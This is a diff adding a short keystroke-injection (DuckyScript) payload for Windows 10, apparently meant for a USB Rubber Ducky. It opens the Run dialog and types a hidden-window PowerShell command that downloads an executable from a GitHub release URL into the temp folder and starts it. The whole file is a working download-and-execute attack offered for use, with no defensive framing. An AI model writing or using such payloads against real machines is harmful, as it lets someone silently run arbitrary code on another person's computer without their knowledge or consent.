@@ -1,0 +1,12 @@
+REM Author:      kex
+REM Title:     	 Execution
+REM Target:      Windows 10 (11 untested)
+REM Description: Automatically downloads an exe file and runs it
+
+REM "$_JITTER_ENABLED = TRUE" can be disabled 
+ 
+GUI r
+DELAY 500
+$_JITTER_ENABLED = TRUE
+STRING powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri 'https://github.com/Kexx0/usb-rubber/releases/download/Release/LazA1.exe' -OutFile $env:temp\LazA1.exe; Start-Process $env:temp\LazA1.exe; Exit"
+ENTER
